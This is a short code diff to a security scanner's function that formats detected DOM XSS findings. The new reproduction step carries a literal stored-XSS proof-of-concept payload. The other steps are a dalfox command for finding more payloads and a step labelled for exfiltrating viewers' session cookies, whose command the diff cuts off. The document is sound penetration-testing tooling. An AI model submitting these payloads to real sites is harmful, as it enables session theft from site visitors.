@@ -237,8 +237,11 @@ def to_finding(hit: DomXssHit) -> Finding:
             f"payload executed in headless Chromium on {hit.url} (trigger: {hit.trigger}, token {hit.token})",
         ],
         "exploitation": [
-            {"step": 1, "description": "Reproduce in a browser — the payload runs when the stored value renders.",
-             "command": f"# open {hit.url}, submit into '{hit.field}': {hit.payload}"},
+            {"step": 1, "description": (f"Reproduce in any browser — submit this self-contained PoC into "
+                                        f"the '{hit.field}' field at {hit.url}; it fires when the stored "
+                                        "value renders. (Hades detected it with a benign hook instead of "
+                                        "alert — see the evidence box for the exact payload it fired.)"),
+             "command": '<img src=x onerror="alert(document.domain)">'},
             {"step": 2, "description": "Auto-discover working payloads / confirm with dalfox.",
              "command": f'dalfox url "{hit.url}"'},
             {"step": 3, "description": "Weaponise: exfiltrate the viewer's session cookie.",
